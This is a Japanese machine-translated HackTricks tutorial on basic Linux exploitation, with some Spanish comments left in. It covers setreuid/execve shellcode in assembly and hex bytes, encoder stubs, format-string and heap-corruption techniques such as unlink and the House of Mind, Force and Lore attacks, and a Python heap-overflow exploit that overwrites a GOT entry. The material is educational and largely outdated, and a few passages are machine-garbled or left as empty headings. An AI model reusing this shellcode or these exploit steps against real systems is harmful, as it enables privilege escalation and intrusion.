# Linux Exploiting (Basic) (SPA)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **2.SHELLCODE**

カーネルの割り込みを表示する: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eaxをクリア\
xor ebx, ebx ; ebx = 0 なので引数はなし\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; システムコールを実行

**nasm -f elf assembly.asm** —> .oファイルを返す\
**ld assembly.o -o shellcodeout** —> アセンブリコードから形成された実行可能ファイルを得て、**objdump**でオペコードを抽出できる\
**objdump -d -Mintel ./shellcodeout** —> 実際に私たちのシェルコードであることを確認し、オペコードを抽出する

**シェルコードが機能するか確認する**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
システムコールが正しく行われているか確認するには、前のプログラムをコンパイルし、システムコールが**strace ./PROGRAMA\_COMPILADO**に表示される必要があります。

シェルコードを作成する際にトリックを使うことができます。最初の命令はcallへのジャンプです。callは元のコードを呼び出し、さらにEIPをスタックに入れます。call命令の後に必要な文字列を入れているため、そのEIPを使って文字列を指し示し、さらにコードの実行を続けることができます。

EJ **トリック (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**EJ スタックを使用して (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Egg Huter:**

プロセスに関連付けられたメモリページを走査し、そこに保存されたシェルコードを探す小さなコードで構成されています（シェルコードに設定された署名を探します）。コードを注入するための小さなスペースしかない場合に便利です。

**Shellcodes polimórficos**

暗号化されたシェルで構成されており、それを復号化してジャンプする小さなコードを持っています。Call-Popのトリックを使用して、これは**暗号化されたシーザーの例**です：
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
## **5.補完的手法**

**ムラット技術**

Linuxではすべてのプログラムは0xbfffffffからマッピングされます。

Linuxで新しいプロセスのスタックがどのように構築されるかを見ることで、プログラムがシェルコードのみを持つ環境で起動されるようにエクスプロイトを開発できます。このアドレスは次のように計算できます: addr = 0xbfffffff - 4 - strlen(完全な実行可能ファイル名) - strlen(shellcode)

このようにして、シェルコードを持つ環境変数のアドレスを簡単に取得できます。

これは、execle関数が必要な環境変数のみを持つ環境を作成できるため可能です。

##

###

###

###

###

### **フォーマット文字列によるバッファオーバーフロー**

**sprintf**はフォーマットされた文字列を**変数に移動します**。したがって、文字列の**フォーマット**を悪用して、内容がコピーされる**変数でバッファオーバーフローを引き起こす**ことができます。\
例えば、ペイロード`%.44xAAAA`は**変数に44B+"AAAA"を書き込み**、これによりバッファオーバーフローが発生する可能性があります。

### **\_\_atexit構造体**

{% hint style="danger" %}
現在、これをエクスプロイトするのは非常に**奇妙です**。
{% endhint %}

**`atexit()`**は、**他の関数がパラメータとして渡される**関数です。これらの**関数**は、**`exit()`**を実行するか、**main**の**戻り**時に**実行されます**。\
これらの**関数**のいずれかの**アドレス**をシェルコードを指すように**変更**できれば、**プロセスの制御を得る**ことができますが、現在はこれがより複雑です。\
現在、実行される**関数へのアドレス**は、いくつかの構造の背後に**隠されており**、最終的に指すアドレスは関数のアドレスではなく、**XORで暗号化され**、**ランダムキー**でオフセットされています。したがって、現在この攻撃ベクターは**x86**および**x64\_86**ではあまり役に立ちません。\
**暗号化関数**は**`PTR_MANGLE`**です。**m68k、mips32、mips64、aarch64、arm、hppa**などの**他のアーキテクチャ**は、**暗号化**関数を実装していません。なぜなら、それは**入力として受け取ったものと同じ**を返すからです。したがって、これらのアーキテクチャはこのベクターで攻撃可能です。

### **setjmp() & longjmp()**

{% hint style="danger" %}
現在、これをエクスプロイトするのは非常に**奇妙です**。
{% endhint %}

**`setjmp()`**は**コンテキスト**（レジスタ）を**保存**することを可能にします。\
**`longjmp()`**は**コンテキスト**を**復元**します。\
**保存されたレジスタ**は: `EBX, ESI, EDI, ESP, EIP, EBP`\
問題は、EIPとESPが**`PTR_MANGLE`**関数によって渡されることです。したがって、**この攻撃に対して脆弱なアーキテクチャは上記と同じです**。\
これらはエラー回復や割り込みに役立ちます。\
しかし、私が読んだところによれば、他のレジスタは保護されていないため、**関数内で`call ebx`、`call esi`、または`call edi`**がある場合、制御を奪うことができます。また、EBPを変更してESPを変更することもできます。

**C++におけるVTableとVPTR**

各クラスには**Vtable**があり、これは**メソッドへのポインタの配列**です。

各**クラス**のオブジェクトには**VPtr**があり、これはそのクラスの配列への**ポインタ**です。VPtrは各オブジェクトのヘッダーの一部であるため、**VPtr**の**上書き**が達成されれば、ダミーメソッドを指すように**変更**され、関数を実行するとシェルコードに飛ぶことができます。

## **予防措置と回避策**

###

**Libsafeの置き換え**

次のようにアクティブ化されます: LD\_PRELOAD=/lib/libsafe.so.2\
または\
“/lib/libsave.so.2” > /etc/ld.so.preload

不安全な関数への呼び出しを安全なものに置き換えます。標準化されていません。（x86専用、-fomit-frame-pointerでコンパイルされたものには適用されず、静的コンパイルには適用されず、すべての脆弱な関数が安全になるわけではなく、LD\_PRELOADはsuidバイナリでは機能しません）。

**ASCII装甲アドレス空間**

0x00000000から0x00ffffffまでの共有ライブラリを読み込むことで、常にバイト0x00が存在するようにします。しかし、これはほとんどの攻撃をほとんど止めることはなく、特にリトルエンディアンではありません。

**ret2plt**

ROPを実行して、strcpy@plt（pltの）を呼び出し、GOTのエントリを指し、呼び出したい関数の最初のバイト（system()）をコピーします。その後、GOT+1を指してsystem()の2バイト目をコピーします… 最後に、GOTに保存されたアドレスを呼び出します。これがsystem()になります。

**chroot()によるサンドボックス**

debootstrap -arch=i386 hardy /home/user —> 特定のサブディレクトリの下に基本システムをインストールします。

管理者は次のようにしてこれらのサンドボックスから出ることができます: mkdir foo; chroot foo; cd ..

**コードの計測**

Valgrind —> エラーを探します。\
Memcheck\
RAD（リターンアドレスディフェンダー）\
Insure++

## **8 ヒープオーバーフロー: 基本的なエクスプロイト**

**割り当てられたチャンク**

prev\_size |\
size | —ヘッダー\
\*mem | データ

**空きチャンク**

prev\_size |\
size |\
\*fd | 前方チャンクへのポインタ\
\*bk | 後方チャンクへのポインタ —ヘッダー\
\*mem | データ

空きチャンクは双方向リスト（bin）にあり、2つの空きチャンクが隣接することはありません（結合されます）。

“size”には、前のチャンクが使用中かどうか、チャンクがmmap()によって割り当てられたかどうか、チャンクがプライマリアリーナに属するかどうかを示すビットがあります。

チャンクを解放する際に、隣接するチャンクのいずれかが空いている場合、これらはunlink()マクロを介して結合され、新しい大きなチャンクがfrontlink()に渡され、適切なbinに挿入されます。

unlink(){\
BK = P->bk; —> 新しいチャンクのBKは、以前に空いていたチャンクのBKです。\
FD = P->fd; —> 新しいチャンクのFDは、以前に空いていたチャンクのFDです。\
FD->bk = BK; —> 次のチャンクのBKは新しいチャンクを指します。\
BK->fd = FD; —> 前のチャンクのFDは新しいチャンクを指します。\
}

したがって、P->bkをシェルコードのアドレスに、P->fdをGOTまたはDTORSのエントリのアドレス-12に変更できれば、次のようになります:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

これにより、プログラム終了時にシェルコードが実行されます。

さらに、unlink()の4番目の文は何かを書き込み、シェルコードはこれに対して修正される必要があります:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) —> これにより、シェルコードの8バイト目から4バイトが書き込まれるため、シェルコードの最初の命令はこれをスキップして残りのシェルコードに飛ぶためのjmpである必要があります。

したがって、エクスプロイトは次のように作成されます:

buffer1にシェルコードを入れ、最初にjmpを入れてnopsまたは残りのシェルコードに飛ぶようにします。

シェルコードの後に、次のチャンクのprev\_sizeとsizeフィールドに到達するまでパディングを入れます。これらの場所に0xfffffff0（prev\_sizeが空いていることを示すビットを持つように上書きされる）と“-4”（0xfffffffc）をsizeに入れます（3番目のチャンクで2番目が実際に空いているかどうかを確認する際に、変更されたprev\_sizeに行くようにします）-> これにより、free()が調査すると、3番目のsizeに行きますが、実際には2番目の-4に行き、2番目のチャンクが空いていると考えます。そして、**unlink()**を呼び出します。

unlink()を呼び出すと、P->fdとして2番目のチャンクの最初のデータを使用するため、そこに上書きしたいアドレス-12（FD->bkに12を加算します）を入れます。そして、そのアドレスに2番目のチャンクで見つけた2番目のアドレスを入れます。これはシェルコードへのアドレスであることが望ましいです（偽のP->bk）。

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12バイトのパディング**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I”, 0xfffffff0) #前のチャンクが空いていることを示すビットが1であることが重要です**

**fake\_size = pack("\<I”, 0xfffffffc) #-4、3番目のチャンクの“size”が4バイト後ろにあると考えさせるため（prev\_sizeを指します）**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #ペイロードの最初に8バイトのパディングを入れます**

**got\_free = pack("\<I", 0x08048300 - 12) #free()のアドレスをplt-12に（シェルコードを呼び出すために上書きされるアドレスになります）**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #ペイロードは最初に8バイトのパディングから始まります**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #2番目のチャンクを変更し、got\_freeはaddr\_sc + 12を保存する場所を指します**

**os.system("./8.3.o " + payload)**

**unset() 逆順で解放（wargame）**

3つの連続したチャンクを制御しており、予約された順序とは逆に解放されます。

その場合:

チャンクcにシェルコードを置きます。

チャンクaを使用してbを上書きし、sizeがPREV\_INUSEビットが無効になっているようにして、チャンクaが空いていると考えさせます。

さらに、bのヘッダーにsizeを-4に上書きします。

これにより、プログラムは“a”が空いていると考え、binに入るため、unlink()を呼び出します。しかし、ヘッダーのPREV\_SIZEが-4であるため、実際にはb+4から始まるチャンクだと考えます。つまり、b+4から始まるチャンクにunlink()を行い、b+12にfdポインタがあり、b+16にbkポインタがあります。

このようにして、bkにシェルコードのアドレスを、fdに“puts()”のアドレス-12を入れることで、ペイロードを得ることができます。

**フロントリンク技術**

何かを解放するときに、隣接するチャンクが空いていない場合にフロントリンクと呼ばれ、unlink()ではなく直接frontlink()が呼び出されます。

mallocが攻撃されるときに決して解放されない場合に有用な脆弱性です。

必要なもの:

データ入力関数でオーバーフローできるバッファ

この隣接するバッファは解放され、前のバッファのオーバーフローによってヘッダーのfdフィールドが変更されます。

サイズが512より大きいが前のバッファより小さいバッファ

この3番目のバッファのprev\_sizeを上書きできるように、前に宣言されたバッファ

このようにして、2つのmallocを制御不能に上書きし、1つを制御可能に解放することで、エクスプロイトを作成できます。

**ダブルfree()脆弱性**

同じポインタでfree()を2回呼び出すと、2つのbinが同じアドレスを指します。

1つを再利用しようとすると、問題なく割り当てられます。別のものを使用しようとすると、同じスペースが割り当てられるため、ポインタ“fd”と“bk”が前の予約によって書き込まれたデータで偽装されます。

**free()後**

以前に解放されたポインタが再び制御なしで使用されます。

## **8 ヒープオーバーフロー: 高度なエクスプロイト**

unlink()とfrontlink()の技術は、unlink()関数を変更することで削除されました。

**心の家**

任意のコードを実行するには、free()を1回呼び出すだけで済みます。攻撃者が制御できる2番目のチャンクを探すことが重要です。

free()の呼び出しはpublic\_fREe(mem)を呼び出し、これを行います:

mstate ar\_ptr;

mchunkptr p;

…

p = mem2chunk(mem); —> チャンクが始まるアドレスへのポインタを返します（mem-8）

…

ar\_ptr = arena\_for\_chunk(p); —> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

…

\_int\_free(ar\_ptr, mem);

}

\[1]では、sizeフィールドのNON\_MAIN\_ARENAビットを確認し、このビットを変更してチェックがtrueを返すようにし、heap\_for\_ptr()を実行します。これにより、memの下位2.5バイトが0に設定され（0x0804a000の場合、0x08000000になります）、0x08000000->ar\_ptrにアクセスします（heap\_info構造体のように）。

このようにして、例えば0x0804a000のチャンクを制御でき、**0x081002a0**でチャンクが解放されると、0x08100000に到達し、任意のものを書き込むことができます。例えば**0x0804a000**。この2番目のチャンクが解放されると、heap\_for\_ptr(ptr)->ar\_ptrが0x08100000に書き込まれたものを返します（前述のandが0x081002a0に適用され、最初の4バイトの値が取得されます）。

このようにして、\_int\_free(ar\_ptr, mem)が呼び出されます。つまり、**\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
…\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

前述のように、avの値を制御できることがわかります。これは、解放されるチャンクに書き込むものです。

unsorted\_chunksが定義されているように、次のことがわかります:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

したがって、av->bins\[2]に\_\_DTOR\_END\_\_-12の値を書き込むと、最後の命令で\_\_DTOR\_END\_\_に2番目のチャンクのアドレスが書き込まれます。

つまり、最初のチャンクの先頭に\_\_DTOR\_END\_\_-12のアドレスを何度も入れる必要があります。なぜなら、av->bins\[2]からそこを取得するからです。

2番目のチャンクのアドレスに最後の5つのゼロがある場合、最初のチャンクのアドレスをこのアドレスに書き込む必要があります。これにより、heap\_for\_ptr()はar\_ptrが最初のチャンクの先頭にあると考え、av->bins\[2]を取得します。

2番目のチャンクでは、最初のチャンクのおかげでprev\_sizeを0x0cのjmpで上書きし、sizeを何かにして-> NON\_MAIN\_ARENAを有効にします。

次に、チャンク2にたくさんのnopsを入れ、最後にシェルコードを入れます。

このようにして、\_int\_free(TROZO1, TROZO2)が呼び出され、prev\_sizeのアドレスが\_\_DTOR\_END\_\_に書き込まれ、シェルコードに飛びます。

この技術を適用するには、ペイロードを少し複雑にするためにいくつかの要件を満たす必要があります。

この技術は、unlinkに対してほぼ同じパッチが適用されたため、もはや適用できません。新しいポイントが同じアドレスを指しているかどうかを比較します。

**Fastbin**

これは心の家の変種です。

次のコードを実行するために必要です。最初のfree()関数のチェックを通過した後に到達します。

fb = &(av->fastbins\[fastbin\_index(size)] —> fastbin\_index(sz) —> (sz >> 3) - 2

…

p->fd = \*fb

\*fb = p

このようにして、fbにGOT内の関数のアドレスを入れると、そのアドレスに上書きされたチャンクのアドレスが入ります。これには、アリーナがdtorsのアドレスの近くにある必要があります。より正確には、av->max\_fastが上書きされるアドレスにある必要があります。

心の家で見たように、avの位置を制御できることがわかります。

したがって、sizeフィールドに8 + NON\_MAIN\_ARENA + PREV\_INUSEのサイズを入れると、fastbin\_index()はfastbins\[-1]を返し、av->max\_fastを指します。

この場合、av->max\_fastは上書きされるアドレスになります（指すアドレスではなく、その位置が上書きされます）。

さらに、解放されたチャンクの隣接チャンクは8より大きくなければなりません。-> 解放されたチャンクのサイズが8であるため、この偽のチャンクには8より大きいサイズを入れる必要があります（シェルコードが解放されたチャンクに入るため、最初にnopsに飛ぶjmpを入れる必要があります）。

さらに、この偽のチャンクはav->system\_memより小さくなければなりません。av->system\_memは1848バイト先にあります。

\_\_DTOR\_END\_のゼロとGOT内の少ないアドレスのため、これらのセクションのアドレスは上書きするのに適していないため、スタックを攻撃するためにfastbinを適用する方法を見てみましょう。

別の攻撃方法は、**av**をスタックにリダイレクトすることです。

sizeを8の代わりに16に変更すると、fastbin\_index()はfastbins\[0]を返し、これを使用してスタックを上書きできます。

これには、canaryやスタック内の奇妙な値がない必要があります。実際、次のような状態でなければなりません: 4バイトのゼロ + EBP + RET

4バイトのゼロは、**av**がこのアドレスにある必要があり、**av**の最初の要素はミューテックスで0である必要があります。

**av->max\_fast**はEBPであり、制約を回避するために役立つ値になります。

**av->fastbins\[0]**は**p**のアドレスで上書きされ、RETになります。これにより、シェルコードに飛びます。

さらに、**av->system\_mem**（スタックの位置から1484バイト上）には、チェックを回避するのに十分なゴミが含まれます。

さらに、解放されたチャンクの隣接チャンクは8より大きくなければなりません。-> 解放されたチャンクのサイズが16であるため、この偽のチャンクには8より大きいサイズを入れる必要があります（シェルコードが解放されたチャンクに入るため、最初にnopsに飛ぶjmpを入れる必要があります）。

**精神の家**

この場合、攻撃者によって変更可能なmallocへのポインタを持つことを目指します（例えば、ポインタが変数へのオーバーフローの下にスタックにある場合）。

このようにして、このポインタを任意の場所に指すようにできます。しかし、どの場所でも有効ではなく、偽のチャンクのサイズはav->max\_fastより小さく、より具体的には将来のmalloc()呼び出しで要求されるサイズに等しくなければなりません。したがって、次のmalloc(40)が呼び出されることがわかっている場合、偽のチャンクのサイズは48でなければなりません。

例えば、プログラムがユーザーに数字を尋ねる場合、48を入力してmallocの変更可能なポインタを次の4バイト（運が良ければEBPに属する可能性がある）に指すことができます。これにより、48が後ろに残り、サイズヘッダーのように見えます。さらに、ptr-4+48のアドレスは複数の条件を満たす必要があります（この場合ptr=EBP）、つまり、8 < ptr-4+48 < av->system\_memです。

これが満たされると、次のmallocがmalloc(40)と呼ばれるとき、EBPのアドレスが割り当てられます。攻撃者がこのmallocに書き込むことができる場合、EBPとEIPを任意のアドレスで上書きできます。

これは、free()が解放する際に、スタックのEBPを指すアドレスに新しいmalloc()のための完璧なサイズのチャンクがあることを記録するためだと思います。したがって、そのアドレスが割り当てられます。

**力の家**

必要なもの:

* wildernessを上書きできるチャンクへのオーバーフロー
* ユーザーによって定義されたサイズでmalloc()を呼び出す
* ユーザーによって定義されたデータを持つmalloc()を呼び出す

最初に、wildernessチャンクのサイズを非常に大きな値（0xffffffff）で上書きします。これにより、十分に大きなメモリ要求は\_int\_malloc()で処理され、ヒープを拡張する必要がなくなります。

次に、av->topを攻撃者の制御下にあるメモリ領域、例えばスタックを指すように変更します。av->topには\&EIP - 8を設定します。

av->topを攻撃者の制御下にあるメモリ領域を指すように上書きする必要があります:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victimは現在のwildernessチャンクのアドレス（現在のav->top）の値を取得し、remainderはそのアドレスにmalloc()で要求されたバイト数を加えたものです。したがって、\&EIP-8が0xbffff224にあり、av->topが0x080c2788を含む場合、次のmalloc()のためにav->topが$EIP-8を指すようにするために、制御されたmallocで予約する必要がある量は次のようになります:

0xbffff224 - 0x080c2788 = 3086207644。

このようにして、av->topに変更された値が保存され、次のmallocはEIPを指し、上書きできるようになります。

新しいwildernessチャンクのサイズが、最後のmalloc()によって行われた要求よりも大きいことを知っておくことが重要です。つまり、wildernessが\&EIP-8を指している場合、サイズはスタックのEBPフィールドに正確に配置されます。

**伝説の家**

**SmallBinの破損**

解放されたチャンクは、そのサイズに基づいてbinに挿入されます。しかし、挿入される前にunsorted binsに保存されます。チャンクが解放されると、すぐにそのbinに入るのではなく、unsorted binsに留まります。次に、新しいチャンクが予約され、以前に解放されたチャンクが役立つ場合、それを返しますが、より大きなものが予約されると、unsorted binsにある解放されたチャンクが適切なbinに挿入されます。

脆弱なコードに到達するには、メモリ要求がav->max\_fast（通常72）より大きく、MIN\_LARGE\_SIZE（512）より小さい必要があります。

binに要求されたサイズに適したチャンクがある場合、それが返され、unlinkされます:

bck = victim->bk; 前のチャンクを指します。これが変更できる唯一の情報です。

bin->bk = bck; 前のチャンクが最後のチャンクになります。bckがスタックを指している場合、次に予約されるチャンクにこのアドレスが与えられます。

bck->fd = bin; このリストを閉じ、これがbinを指すようにします。

必要なもの:

2つのmallocを予約し、最初のものが解放された後にオーバーフローできるようにします（つまり、2番目のチャンクが解放された後に、より大きなmallocが予約される必要があります）。

攻撃者が選択したアドレスを持つmallocが攻撃者によって制御される必要があります。

目的は次のとおりです。もし、ヒープに解放されたチャンクがあり、その下に解放されたチャンクがある場合、bkポインタを変更できます。bkポインタを変更し、このチャンクがbinの最初のものになり、予約されると、binを欺いて、リストの最後のチャンク（次に提供されるもの）が、私たちが指定した偽のアドレスにあると考えさせることができます（スタックやGOTなど）。したがって、別のチャンクが再予約され、攻撃者がその中に権限を持っている場合、希望する位置にチャンクが与えられ、そこに書き込むことができます。

変更されたチャンクを解放した後、解放されたチャンクよりも大きなチャンクを予約する必要があります。これにより、変更されたチャンクがunsorted binsから出て、その適切なbinに挿入されます。

一度binに入ると、オーバーフローを介してbkポインタを変更して、上書きしたいアドレスを指すようにします。

このようにして、binはmalloc()が十分に呼び出されるのを待つ必要があります。これにより、変更されたbinが再利用され、次のチャンクが偽のアドレスにあると考えられます。次に、私たちが興味のあるチャンクが提供されます。

脆弱性をできるだけ早く実行するには、次のようにするのが理想的です: 脆弱なチャンクの予約、変更されるチャンクの予約、このチャンクを解放、より大きなチャンクの予約、チャンクの変更（脆弱性）、脆弱なチャンクと同じサイズのチャンクの予約、同じサイズの2番目のチャンクの予約、これが選択したアドレスを指します。

この攻撃を防ぐために、チャンクが「偽」でないことを確認するための典型的なチェックが使用されます: bck->fdがvictimを指しているかどうかを確認します。つまり、私たちのケースでは、スタックで指されている偽のチャンクのポインタfd*がvictimを指しているかどうかを確認します。この保護を回避するために、攻撃者は何らかの方法で（おそらくスタックを介して）適切なアドレスにvictimのアドレスを書き込むことができる必要があります。これにより、真のチャンクのように見えるようになります。

**LargeBinの破損**

以前と同じ要件が必要で、さらに、予約されたチャンクは512より大きくなければなりません。

攻撃は前のものと同様で、bkポインタを変更する必要があり、すべてのmalloc()呼び出しが必要ですが、さらに、変更されたチャンクのサイズをそのサイズ - nbが<MINSIZEになるように変更する必要があります。

例えば、サイズを1552に設定すると、1552 - 1544 = 8 < MINSIZEになります（引き算は負になってはいけません。なぜなら、unsignedが比較されるからです）。

さらに、さらに複雑にするためのパッチが導入されました。

**ヒープスプレー**

基本的には、可能な限りすべてのメモリを予約し、これをnopsのマットレスとシェルコードで埋めることを意味します。さらに、マットレスとして0x0cを使用します。これにより、0x0c0c0c0cのアドレスに飛ぼうとし、これにより、呼び出されるアドレスがこのマットレスで上書きされると、そこに飛びます。基本的に、この戦術は、できるだけ多くの予約を行い、ポインタが上書きされるかどうかを確認し、0x0c0c0c0cに飛ぶことを期待しています。

**ヒープ風水**

予約と解放を通じてメモリをセグメント化し、空きチャンクの間に予約されたチャンクを配置します。オーバーフローするバッファは、これらの卵の1つに配置されます。

**objdump -d 実行可能ファイル** —> 関数を逆アセンブル\
**objdump -d ./PROGRAMA | grep FUNCION** —> 関数アドレスを取得\
**objdump -d -Mintel ./shellcodeout** —> 実際にシェルコードであることを確認し、OpCodesを取得\
**objdump -t ./exec | grep varBss** —> シンボルテーブル、変数と関数のアドレスを取得\
**objdump -TR ./exec | grep exit(func lib)** —> ライブラリ関数のアドレスを取得（GOT）\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** —> GOTで上書きするputsのアドレスを取得\
**objdump -D ./exec** —> pltのエントリまで全てを逆アセンブル\
**objdump -p -/exec**\
**Info functions strncmp —>** gdbでの関数情報

## 興味深いコース

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **参考文献**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

{% hint style="success" %}
AWSハッキングを学び、実践する:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを送信してハッキングトリックを共有してください。**

</details>
{% endhint %}
